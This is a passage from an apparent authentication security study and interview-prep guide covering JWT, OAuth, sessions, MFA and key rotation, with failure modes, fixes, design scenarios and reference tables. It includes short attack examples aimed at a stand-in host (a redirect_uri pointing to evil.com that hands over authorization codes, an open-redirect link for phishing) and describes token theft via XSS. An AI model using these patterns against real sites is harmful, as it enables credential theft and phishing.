**Mitigations:** Redis Sentinel or Cluster for HA. Circuit breaker on the session store client — if the store is unreachable, degrade gracefully (e.g., allow read-only access with reduced trust). Distinguish "session not found" from "store unavailable" in error handling. Alert on elevated 401 rates as a leading indicator of session store issues.

### JWKS Endpoint Unavailable — Verify Fails Open or Closed

Services cache the AS's public keys fetched from the JWKS endpoint. If the endpoint goes down and the cache expires, services can no longer verify JWTs. Depending on implementation, the failure mode is either: reject all tokens (denial of service for all authenticated users) or fail open and accept unverified tokens (critical security hole).

**The correct behaviour:** Fail closed — reject all tokens when the signing key cannot be verified. Serve a 503, not a 401 — it signals a system error, not a credential failure, and avoids confusing users into thinking they need to log in again.

**Mitigation:** Set JWKS cache TTL long enough to survive short AS outages (5–60 minutes). When an unknown `kid` appears, attempt a single cache refresh — but don't retry aggressively on outage (thundering herd against a recovering AS). Log "JWKS unavailable" distinctly from "invalid token."

### IdP Downtime — Authentication Completely Blocked

If your authentication flow depends on an external identity provider (Google, Auth0, Okta), IdP downtime means no new logins. Existing sessions/tokens remain valid until expiry, but any user who isn't already authenticated is locked out.

**Mitigations:** Cache the JWKS aggressively with long TTL so existing token verification continues during outage. For critical internal tooling, maintain a break-glass authentication path (local admin account not federated through the IdP). Monitor IdP status as a dependency in your SLO — IdP SLAs are typically 99.9%, which means ~8.7 hours of downtime per year.

### Token Leakage via Logs and Error Tracking

Access tokens appearing in server access logs (as query parameters or in Authorization headers), error reporting tools (Sentry capturing full request headers), or analytics pipelines. A token in a log is as good as the token itself — anyone with log access has it.

**Common vectors:**

- Tokens passed as URL query parameters: `GET /api/data?token=eyJ...` — logged by every web server, proxy, and CDN by default
- Error reporters serialising the full request object including headers
- Debug logging enabled in production that includes raw request/response

**Mitigations:** Never put tokens in URL query parameters — always use the `Authorization` header or an HttpOnly cookie. Configure error trackers to scrub `Authorization` headers and cookie values before capturing. Audit log pipelines for token-shaped strings. Use short-lived access tokens to limit the value of any leaked token.

### OAuth `redirect_uri` Manipulation

The OAuth spec requires the `redirect_uri` in the token exchange to exactly match what was registered. If the AS performs prefix matching or allows wildcards, an attacker can register `https://app.example.com/` and redirect to `https://app.example.com.evil.com/callback`.

**Attack:** Attacker crafts an authorization URL with a manipulated `redirect_uri`. User authenticates. AS redirects the authorization code to the attacker's URL. Attacker exchanges the code for tokens.

**Fix at the AS:** Exact URI matching, no wildcards, no path prefix matching. Reject any `redirect_uri` that doesn't match a registered value byte-for-byte. At the client: always validate the `state` parameter on callback to ensure the redirect came from an auth flow your client initiated.

### Open Redirect After Authentication — `?next=` Hijacking

Login pages commonly accept a `next` or `returnTo` parameter to redirect users to their original destination after login:

```
GET /login?next=/dashboard
```

If the `next` parameter is not validated, an attacker links:

```
https://app.example.com/login?next=https://evil.com
```

The user logs in successfully and is redirected to the attacker's site — which can display a convincing phishing page, having just seen a legitimate login succeed.

**Fix:** Validate that `next` is a relative path within your application, not an absolute URL or a different domain. Reject any `next` value that starts with `//`, `https://`, or contains a hostname.

### Account Enumeration via Login Error Messages

Login returns different responses for "user not found" vs "wrong password":

```
POST /login → "No account found with that email"
POST /login → "Incorrect password"
```

An attacker can enumerate which email addresses have accounts by probing the login endpoint — useful for targeted phishing and credential stuffing.

**Fix:** Return a single, identical response for all failed login attempts: "Invalid email or password." Apply the same response time regardless of which failure occurred (constant-time comparison + artificial delay) to prevent timing-based enumeration.

### Non-Constant-Time Credential Comparison — Timing Attack

String comparison short-circuits on the first mismatched byte. An attacker who can measure response latency can determine how many leading bytes of their guess were correct, and progressively refine until they crack the credential.

Relevant for: CSRF token comparison, HMAC signature verification, API key comparison.

**Fix:** Always use a constant-time comparison function:

```python
import hmac

def safe_compare(a: str, b: str) -> bool:
    return hmac.compare_digest(a.encode(), b.encode())
```

`hmac.compare_digest` (Python), `crypto.timingSafeEqual` (Node.js), and equivalent functions in other runtimes compare the full byte sequence regardless of where a mismatch occurs.

### Stale JWKS Cache — Key Rotation Rejection

The AS rotates its signing key. The new key is published at the JWKS endpoint alongside the old key. Services that cache JWKS aggressively continue verifying old-`kid` tokens successfully until cache expiry — correct behaviour.

**The failure mode:** Services that cache too aggressively (multi-hour TTL) after the old key is _removed_ from JWKS (before all tokens signed with it have expired) begin rejecting valid tokens with "unknown kid." Users with recently issued tokens are logged out mid-session.

**Fix:** Key rotation protocol must account for active token lifetime. Keep the old key in JWKS for at least one full access token TTL after rotating. Services should also attempt a JWKS refresh on unknown `kid` (one retry, not a loop) to handle the case where a new key was introduced since the last cache fill.

### Refresh Token Theft — Silent Session Takeover

A refresh token stolen from a user's browser (via XSS on a non-HttpOnly cookie, or from localStorage) gives an attacker indefinite access. Unlike a stolen access token (bounded by TTL), a stolen refresh token can produce new access tokens until it expires or is explicitly revoked.

**Detection:** Refresh token rotation with reuse detection (covered in Token Lifecycle Management). Without rotation, stolen refresh tokens are undetectable until the user notices anomalous activity.

**Signals to monitor:** Refresh token use from a different IP than it was issued on, unusual geographic velocity (refresh in London, then Tokyo 20 minutes later), higher-than-expected token refresh frequency for a single user.

### Session Fixation — Pre-Auth Session Reuse

Covered in Session-Based Authentication. Consolidated here: attacker plants a known session ID on the victim before login; after the victim authenticates, the server associates the known ID with the valid user. **Fix:** Regenerate session ID on every successful authentication, unconditionally.

### JWT `exp` Clock Skew Cascade

At scale with many service instances, a JWT issued at `iat=T` with `exp=T+900` may be rejected by an instance whose clock is behind by more than the configured `leeway`. If NTP sync fails across a cluster, a subset of instances starts rejecting valid tokens — producing intermittent 401s that are extremely difficult to diagnose because the token looks valid everywhere else.

**Mitigation:** Monitor clock drift across service instances (standard infrastructure health check). Set `leeway` to 30–60 seconds in JWT verification to tolerate normal NTP variance. Alert on elevated 401 rates that don't correlate with traffic spikes — a sign of a clock issue rather than a credential issue.

---

## Common Interview Gotchas

**OAuth is an authentication protocol.**
Wrong. OAuth 2.0 is a delegated _authorization_ framework. It answers "can this client access this resource?" — not "who is this user?". OIDC is the identity layer on top that answers the authentication question. Using an access token to identify a user without OIDC is a real, exploited vulnerability.

---

**JWTs are encrypted and the payload is private.**
Wrong. A standard JWT (JWS) is signed, not encrypted. The payload is base64url-encoded — decode it in a browser console in 5 seconds. Anyone who intercepts the token can read all claims. JWE (JSON Web Encryption) is the encrypted variant, rarely used in practice. Never put secrets, PII beyond what's necessary, or sensitive authorization decisions in a JWT payload that travels to the client.

---

**Deleting the cookie logs the user out (for JWT-based auth).**
Deleting the client-side cookie removes the client's copy of the token. The JWT itself remains cryptographically valid until `exp`. If the token was intercepted before deletion, the attacker's copy still works. For session-based auth this is correct — deleting the server-side session record revokes access immediately. For JWTs, logout requires a blocklist, token version increment, or accepting the TTL window.

---

**SameSite=Strict is the most secure option and should always be used.**
Strict is maximally protective but breaks OAuth and SAML redirect flows. After a user authenticates at the IdP and is redirected back to your app, the browser considers that a cross-site navigation — and won't send the session cookie. The user appears logged out immediately after a successful login. `Lax` is the correct default: it blocks cross-site sub-resource requests (XHR, fetch, form POST) while allowing top-level navigations.

---

**Store auth tokens in localStorage for simplicity — it's easier than cookies.**
Any XSS vulnerability on your domain exposes localStorage to `localStorage.getItem('token')`. An attacker's script, a compromised third-party analytics snippet, or a CDN-hosted library with malicious code can exfiltrate the token silently. The token persists across sessions. Use HttpOnly cookies for credentials that should survive page refresh; in-memory for access tokens.

---

**Sessions don't scale horizontally.**
They scale fine — the solution is a shared session store (Redis). The cost is one Redis read per request (~0.3ms). The misconception conflates "sessions require shared state" with "sessions can't scale." JWT's advantage is eliminating that I/O, not making the system horizontally scalable (which Redis already does for sessions).

---

**Rotating signing keys requires downtime — old tokens become invalid.**
Not with JWKS and `kid`. Publish the new key at the JWKS endpoint _alongside_ the old one. Switch signing to the new key. Services encountering an unknown `kid` fetch the updated JWKS. After one full access token TTL has passed (all old-key tokens have expired), remove the old key. Zero downtime, zero forced logouts.

---

**PKCE is only for mobile apps and SPAs — server-side apps with client secrets don't need it.**
The original motivation was public clients (no secure secret storage), but PKCE is now recommended for all OAuth clients. A compromised authorization code is useless without the code verifier. The PKCE check adds negligible overhead and eliminates an entire attack class. OAuth 2.1 (the successor draft) makes PKCE mandatory for all grant types involving the authorization code.

---

**The Implicit Flow is fine for SPAs — it's simpler and widely documented.**
Deprecated. RFC 9700 (OAuth 2.0 Security Best Current Practice) explicitly states the Implicit Flow should not be used for new deployments. The access token in the URL fragment is in browser history, server logs, and readable by all scripts on the page. Authorization Code + PKCE replaces it with no meaningful complexity cost.

---

**MFA means two-factor — any two methods are sufficient.**
MFA requires at least two factors from _different categories_: something you know, something you have, something you are. A password + security question is one factor (both are "something you know") — not MFA. Password + TOTP code is MFA. Password + SMS OTP is technically MFA but with a weak second factor (SS7/SIM swap vulnerable).

---

**bcrypt is the best password hashing algorithm.**
bcrypt was the best option for a long time but has two known issues: the silent 72-byte password truncation, and it is not memory-hard (GPU-parallelisable). Argon2id is the current recommendation (OWASP, NIST SP 800-63B). It is memory-hard (defeats GPU cracking), resistant to side-channel attacks, and parameterised for both time and memory cost.

---

**The `alg:none` vulnerability is theoretical — real libraries don't accept it.**
It was exploited in production. CVE-2015-9235 affected `jsonwebtoken` (Node.js), one of the most widely used JWT libraries, accepting `alg:none` and bypassing signature verification entirely. Multiple libraries across different languages had the same issue. Always explicitly specify the allowed algorithm(s) in the verifier configuration — never read the algorithm from the token header.

---

**Short access token expiry makes the system secure without refresh tokens.**
Short expiry limits the _window_ of a stolen token but doesn't prevent theft. Without refresh tokens, users must re-authenticate every 15 minutes — not viable for any real application. Short expiry is only useful paired with refresh tokens. The access token is the one that travels frequently (every API request); the refresh token is exchanged rarely and can be stored more securely.

---

**Client Credentials tokens are issued on behalf of the user.**
Client Credentials is a machine-to-machine flow — no user is involved. The token represents the _client application's_ identity and permissions, not any user's. A service using Client Credentials to call another service should be authorized based on what the service is allowed to do, not impersonating any user.

---

**Refresh token rotation means the user must log in again when the old token is reused.**
On detecting reuse of an already-rotated token, the AS revokes the _entire token family_ — both the legitimate client's current token and the attacker's stolen old token. Both parties lose access and must re-authenticate. The AS cannot determine which party is legitimate, so full revocation is the correct and conservative response. This is expected behaviour, not a bug.

---

## Interview Scenario & Debugging Bank

### Scenario 1 — Design Auth for a Multi-Tenant SaaS Application

**Setup:** B2B SaaS product. Each customer (tenant) has their own users. Enterprise customers require SSO through their corporate IdP (Okta, Azure AD). Self-serve customers use username/password. All tenants share the same API but must be strictly isolated from each other's data.

**Ideal approach:**

1. **Tenant identification first.** On login, identify which tenant the user belongs to — by subdomain (`acme.yourapp.com`), email domain, or explicit tenant selection. Tenant context must be established before any auth decision.

2. **Federated auth for enterprise tenants.** Enterprise customers configure their IdP (SAML or OIDC). Your platform acts as the Relying Party. On login from `acme.com`, detect the domain, redirect to Acme's IdP, receive the assertion or ID token, and create or link a user record in your system.

3. **Local auth for self-serve tenants.** Username/password with Argon2id. TOTP or WebAuthn for MFA.

4. **JWT with tenant claim.** After authentication (regardless of method), issue a short-lived JWT containing `sub` (user ID), `tid` (tenant ID), `roles`, `exp`. Every API request carries this token. The API verifies the JWT, extracts `tid`, and enforces tenant-level data isolation at the query layer (`WHERE tenant_id = $tid`).

5. **Tenant isolation in the token.** A token issued for tenant A must be rejected by tenant B's resources. A `tid` claim, validated server-side on every request, enforces this — never trust a tenant ID from the request body.

**Common mistakes:**

- Trusting tenant ID from the client (query param, request body) rather than a validated JWT claim
- No `tid` in the token — requires a DB lookup on every request to recover tenant context
- Not handling the case where a user's enterprise IdP configuration changes mid-session

**Follow-up questions:**

- "A tenant's IdP goes down. What happens?" → Existing JWTs remain valid. New logins for that tenant fail. Mitigation: break-glass local admin account per tenant not federated through their IdP.
- "A user belongs to multiple tenants — how do you handle that?" → Separate token per tenant context. Login selects a tenant; the issued JWT is scoped to that tenant. Switching tenants requires a new token exchange, not re-authentication.

---

### Scenario 2 — Debugging: Users Randomly Logged Out

**Setup:** Users report being unexpectedly logged out — randomly, more frequent during peak hours. The app uses JWTs with 1-hour expiry and refresh tokens in HttpOnly cookies. Refresh happens automatically on the client.

**Debugging — work through causes in order:**

**1. Logouts at exactly 1-hour marks?** Token refresh is failing. Check: is the refresh endpoint returning errors? Is the refresh cookie being sent (SameSite scope, domain attribute)?

**2. Logouts after a successful refresh?** Rotation race condition. Multiple browser tabs each detect near-expiry and both call `/token/refresh`. The second call presents an already-rotated token → AS detects reuse → revokes family → forced logout. Fix: single-tab refresh coordination via `BroadcastChannel` API or a local mutex.

**3. Intermittent logouts, different service instances?** Fetch the rejected JWT and check `exp` against the rejecting instance's clock. If `exp` is in the future, clock drift exceeds configured `leeway`. Check NTP sync on affected nodes.

**4. Elevated 401s during peak hours correlated with Redis metrics?** Session store latency or connection pool exhaustion causes timeout on session lookup → treated as not found → 401. Check Redis slow log.

**Resolution path:** Peak hours + multi-tab = refresh race. Single-tab, irregular = clock skew or cookie scope. Exactly at expiry = refresh silently failing.

---

### Scenario 3 — Suspended Account Still Has API Access

**Setup:** Security audit finds suspended users can still make successful API calls for up to 15 minutes after suspension. The API uses JWTs with 15-minute expiry.

**Root cause:** Expected behaviour of stateless JWTs. Suspension is recorded in the DB but the already-issued token is cryptographically valid and verified locally without a DB check.

**Solutions — in order of trade-off:**

**Accept the window** (if 15 min tolerable): Immediately revoke the refresh token. The suspended user cannot obtain a new access token after the current one expires. The effective revocation window equals the access token TTL.

**Token version counter:** Add `token_version` to the user record, embed it in the JWT. On verification, read the user's current version from Redis (short TTL — 30 seconds to limit DB hits). Suspending a user increments their version — all existing tokens fail on next request. One cache read per request.

**`jti` blocklist:** On suspension, add the user's active `jti` values to a Redis blocklist with TTL equal to remaining token lifetime. Requires tracking active tokens per user.

**Token introspection:** Replace local JWT verification with a call to the AS introspection endpoint. Instant revocation. Cost: one AS call per API request — cache introspection results for 30–60 seconds.

**Follow-up:** "Which for a payments API?" → Introspection or `jti` blocklist. A 15-minute window is not acceptable when financial transactions can occur under a suspended account. The added latency is justified.

---

### Scenario 4 — Design Auth for a Mobile Banking App

**Setup:** Mobile banking app. Requirements: MFA for all users, step-up for high-value transactions, 30-day remember-device, full audit trail.

**Ideal design:**

**Login:** Password (Argon2id server-side) → biometric MFA via platform authenticator (Face ID / fingerprint) as primary, TOTP as fallback, SMS OTP as last resort with explicit risk disclosure.

**Tokens:** 5-minute access token (banking requires short window) + 30-day refresh token stored in hardware-backed keychain (iOS Keychain / Android Keystore — inaccessible to other apps, hardware-protected). Access token kept in-memory only.

**Step-up for transactions:**

- Base session: `acr=loa2` (password + MFA at login)
- Transfer endpoint requires `acr=loa3` + `auth_time` within 60 seconds
- If insufficient: 403 with step-up challenge → client triggers local biometric prompt → AS issues upgraded token → client retries

**Remember device:** Refresh token bound to a device fingerprint (device ID + OS + model). On refresh, fingerprint is verified. Refresh from an unrecognised device triggers notification + step-up.

**Audit trail:** Every auth event (login attempt, MFA result, token refresh, step-up, logout) written to an append-only log: timestamp, user_id, device_id, IP, event_type, outcome. Replicated off the primary system for tamper resistance.

**Follow-up:** "User loses their phone?" → Refresh token in hardware keychain is inaccessible without the device passcode. Remote wipe invalidates the device fingerprint — all refresh attempts from that device are rejected. Re-authentication on new device requires password + MFA via backup codes.

---

### Scenario 5 — Migrate from Sessions to JWTs Without Logging Everyone Out

**Setup:** Monolith uses server-side sessions in Redis. Breaking into microservices — services don't share the Redis instance. Migrate 2M active users to JWTs without forcing re-login.

**Three-phase dual-mode migration:**

**Phase 1 — New logins get JWTs; existing sessions remain valid.**
Add JWT issuance to the login flow alongside the existing session cookie. Verification middleware checks for JWT first; falls back to session lookup. No user-visible change.

**Phase 2 — Opportunistically upgrade active sessions.**
On each authenticated session request, issue a JWT as an additional cookie. After one session TTL, all recently active users have been migrated. Sessions that haven't been used in `max_session_TTL` expire naturally.

**Phase 3 — Remove session fallback.**
After `max_session_TTL` has elapsed since Phase 2 began, all active users have JWTs. Remove the Redis session lookup fallback. Decommission the shared session store.

**Key prerequisite:** The JWKS endpoint must be live and all services configured to verify against it _before Phase 1 begins_. Generate the signing key pair, publish JWKS, validate the verification flow end-to-end before issuing a single JWT.

**Follow-up:** "A new microservice needs the user's identity from the JWT. How does it read it if it can't decrypt it?" → A standard JWT (JWS) is signed, not encrypted. Any service with the public key can verify the signature and read the payload. Decode the base64url payload, verify the signature, read the `sub` claim directly.

---

## Appendices

### Acronyms & Abbreviations

| Acronym | Full Form                                         | One-line meaning                                                                           |
| ------- | ------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| AuthN   | Authentication                                    | Verifying the identity of a principal                                                      |
| AuthZ   | Authorization                                     | Determining what an authenticated principal can do                                         |
| JWT     | JSON Web Token                                    | Self-contained signed token carrying claims; see [JWT](./jwt.md) for full anatomy          |
| OIDC    | OpenID Connect                                    | Identity layer on top of OAuth 2.0 that enables authentication                             |
| AS      | Authorization Server                              | Issues tokens; the trust anchor in OAuth/OIDC flows                                        |
| RS      | Resource Server                                   | Hosts protected resources; validates access tokens on each request                         |
| RP      | Relying Party                                     | OIDC term for the client application consuming the ID token                                |
| IdP     | Identity Provider                                 | System that stores identities and issues assertions or tokens                              |
| PKCE    | Proof Key for Code Exchange                       | Code verifier/challenge mechanism preventing authorization code interception               |
| ACR     | Authentication Context Class Reference            | Claim indicating the assurance level of the authentication that occurred                   |
| AMR     | Authentication Methods References                 | Array of methods used (e.g., `pwd`, `otp`, `hwk`)                                          |
| TOTP    | Time-based One-Time Password                      | 6-digit code derived from a shared secret and the current 30-second time window            |
| HOTP    | HMAC-based One-Time Password                      | Counter-based OTP; the base algorithm TOTP is built on                                     |
| MFA     | Multi-Factor Authentication                       | Authentication using 2+ factors from distinct categories                                   |
| SSO     | Single Sign-On                                    | One authentication event grants access to multiple services                                |
| mTLS    | Mutual TLS                                        | Both client and server prove identity with certificates during the TLS handshake           |
| SPIFFE  | Secure Production Identity Framework For Everyone | CNCF standard for automatic workload identity across heterogeneous infrastructure          |
| SPIRE   | SPIFFE Runtime Environment                        | Reference implementation of SPIFFE                                                         |
| SS7     | Signaling System 7                                | Legacy telecom signaling protocol with no carrier authentication; enables SMS interception |
| CSRF    | Cross-Site Request Forgery                        | Attack that tricks a browser into making authenticated requests to another site            |
| XSS     | Cross-Site Scripting                              | Attack that injects executable scripts into a web page's origin context                    |

---

### Anti-patterns

- **Long-lived access tokens without a revocation strategy** — the stolen token window equals the token lifetime; keeps working until expiry regardless of account state. Use short TTL (15 min) + refresh tokens, and add a revocation mechanism for high-security actions.

- **Implicit Flow for SPAs** — access token in the URL fragment is in browser history, server logs, and readable by all scripts on the page. Use Authorization Code Flow + PKCE.

- **Storing the refresh token in localStorage** — XSS anywhere on the domain reads it with one line of JavaScript; the stolen refresh token gives indefinite access. Store refresh tokens in HttpOnly Secure cookies.

- **HS256 in a multi-service architecture** — any service holding the symmetric secret can forge tokens for any user. Use RS256 or ES256: only the private key signs, all services verify with the public key.

- **Trusting the JWT's own `alg` header for verification** — enables `alg:none` and algorithm confusion attacks. Always pin the allowed algorithm(s) explicitly in the verifier; never read the algorithm from the token.

- **Using an OAuth access token to identify the user** — an access token answers "what is this client authorized to do?", not "who is this user?". A token issued to service A can be replayed to service B. Use the OIDC ID token with `aud` validation for authentication.

- **Skipping `aud` validation on ID tokens** — a token issued for client A is accepted by client B. An attacker who obtains a token for a low-privilege service can replay it against a higher-privilege one. Always validate `aud` matches your `client_id`.

- **Single MFA option (SMS only)** — SS7 interception and SIM swap attacks bypass SMS OTP entirely. Offer TOTP and WebAuthn; SMS as last resort only.

- **Not regenerating session ID on successful login** — session fixation: an attacker who planted a known session ID before login now holds a valid authenticated session. Always call `session.regenerate_id()` immediately after authentication succeeds.

- **Not implementing back-channel logout in SSO** — logging out of one application leaves the user silently authenticated in all other applications sharing the same IdP session. Implement OIDC Back-Channel Logout for any SSO deployment.

- **Embedding role/permission claims in long-lived JWTs** — permissions change (role revoked, scope reduced) but the token doesn't until it expires. Use short-lived tokens or a token version check, and never embed permissions in tokens with TTL > 15 minutes without a server-side verification step.

- **Sharing a pepper across all environments** — the pepper's value is the production secret. A dev/staging pepper leaked via a code repo or config file doesn't compromise production — only if all environments share the same value. Use distinct peppers per environment.

---

### Selection Matrix

| Dimension                            | Session-Based                                             | Opaque Token                                         | JWT                                                | OAuth + OIDC                                              |
| ------------------------------------ | --------------------------------------------------------- | ---------------------------------------------------- | -------------------------------------------------- | --------------------------------------------------------- |
| **Revocation speed**                 | Instant                                                   | Instant (delete from store)                          | Delayed (TTL-bound unless blocklist)               | Depends on token type used                                |
| **Server state required**            | Yes (session store)                                       | Yes (token store + introspection)                    | No (local verification)                            | Depends on token type                                     |
| **Token size**                       | ~32 bytes (opaque ID)                                     | ~32 bytes                                            | ~300–500 bytes                                     | Varies                                                    |
| **Cross-service verification**       | Requires shared store                                     | Requires introspection endpoint                      | Native (verify locally with public key)            | Native with JWKS                                          |
| **Horizontal scalability**           | Needs shared Redis                                        | Needs introspection AS                               | Trivial                                            | Trivial                                                   |
| **Third-party / federated identity** | No                                                        | No                                                   | No (internal only)                                 | Yes — designed for it                                     |
| **User identity in token**           | Server-side only                                          | Server-side only                                     | In claims (readable)                               | ID token (OIDC)                                           |
| **SPA / mobile client fit**          | Poor (cookie complexity)                                  | Poor (requires store access)                         | Good                                               | Best (designed for public clients)                        |
| **Microservices fit**                | Poor (shared store required)                              | Moderate (introspection hop)                         | Good                                               | Good                                                      |
| **Implementation complexity**        | Low                                                       | Moderate                                             | Moderate                                           | High                                                      |
| **Best for**                         | Monoliths, internal tools, high-revocability requirements | APIs needing instant revocation without JWT overhead | Distributed systems, stateless APIs, microservices | Third-party auth, SSO, mobile/SPA with federated identity |
